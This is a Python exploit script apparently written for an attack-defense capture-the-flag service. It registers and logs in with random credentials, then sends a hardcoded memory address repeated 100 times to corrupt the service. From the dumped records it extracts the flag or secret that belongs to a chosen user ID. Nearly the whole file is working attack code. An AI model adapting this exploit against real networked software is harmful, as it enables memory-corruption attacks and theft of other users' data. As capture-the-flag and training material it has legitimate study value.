#!/usr/bin/env python
import sys
import struct
import json
import traceback
import socket
import struct
import sys
import os
import random
import math

ok = 'ACK_OK'
DEBUG = False


#create and connect to the socket
def getSocket(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, int(port)))
    return s

def recvMessage(s):
    l = s.recv(4)
    L = struct.unpack('<I',l)[0]
    #print L
    data = ''
    while (len(data)<L):
        data += s.recv(L-len(data))
    return data

def sendMessage(s,mess):
    l = len(mess)
    byteLength = struct.pack('<I', l)
    s.sendall(byteLength)
    s.sendall(mess)

def closeSocket(s):
    s.close()


class Exploit():
    def __init__(self):
        self.error = 0
        self.error_msg = ''
        self.flag = ''
        self.expl_addr = '\xb0\xbe\x04\x08'

    def makeCredentials(self):
        if (DEBUG):
            print "function makeCredential()"
        a = ['0','1','2','3','4','5','6','7','8','9','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z']
        nameLength = random.randint(5,20)
        pwdLength = random.randint(5,30)
        name = ''
        pwd = ''
        for i in range(1,nameLength):
            name += a[random.randint(0,len(a)-1)]
        for i in range(1,pwdLength):
            pwd += a[random.randint(0,len(a)-1)]
        if (DEBUG):
            print name
        if (DEBUG):
            print pwd
        return name,pwd

    def do_exploit(self, s, flag_id):
        #
        # register
        #
        recvMessage(s)#receive menu

        sendMessage(s,'r')
        data = recvMessage(s)#receive status
        data = recvMessage(s)#receive username
        name, pwd = self.makeCredentials()        
        sendMessage(s, name) #send username
        data = recvMessage(s) #receive pwd

        sendMessage(s, pwd) #send pwd
        data = recvMessage(s) #receive status
        if (data!=ok): #error
            print data
            raise Exception("Cant register")

        data = recvMessage(s) #receive confirm
        uid = data.split('<')[1].split('>')[0]
        data = recvMessage(s) #receive status

        #
        # login
        #
        sendMessage(s,'l') #send command
        data = recvMessage(s) #receive status
        data = recvMessage(s) #receive confirm
        sendMessage(s,uid) #send username
        data = recvMessage(s) #receive pwd
        sendMessage(s, pwd) #send pwd
        data = recvMessage(s) # receive status
        if (data!=ok):
            raise Exception("Cant Login")
        
        data = recvMessage(s) #receive confirm

        #
        # exploit
        #
        data = recvMessage(s) #receive screen
        sendMessage(s,'a') #send command
        data = recvMessage(s) #receive screen
        data = recvMessage(s) #receive screen
        
        if (data != ok):
            raise Exception("Exploit failed :(")
        data = recvMessage(s)
        sendMessage(s,"0.0")
        data = recvMessage(s)
        sendMessage(s,"0.0")
        data = recvMessage(s)
        sendMessage(s,self.expl_addr*(100))
        data = recvMessage(s) #receive status
        data = recvMessage(s) # GET ALL DATA
        info = data.split(':')
        i = 0
        while True:
            uid = info[i+3]
            if flag_id == uid:
                return info[i+6]
            i += 7
        

    def execute(self, ip, port, flag_id):
        data = ''
        self.error = 0
        self.error_msg = ''
        self.flag = ''

        try:
            s = getSocket(ip, port)
        except Exception as e:
            self.flag = ''
            self.error = 1
            self.error_msg = "connection refused"
            return self.result()

        try:
            data = self.do_exploit(s, flag_id)
        except Exception as e:
            self.flag = ''
            self.error = 1
            self.error_msg = str(e)
            return self.result()

        self.flag = data
        return self.result()

    def result(self):
        return {'payload' : {'flag': self.flag},
                'error' : self.error,
                'error_msg' : self.error_msg,
                }


if __name__ == "__main__":
    print json.dumps(Exploit().execute(sys.argv[1], int(sys.argv[2]), sys.argv[3]))
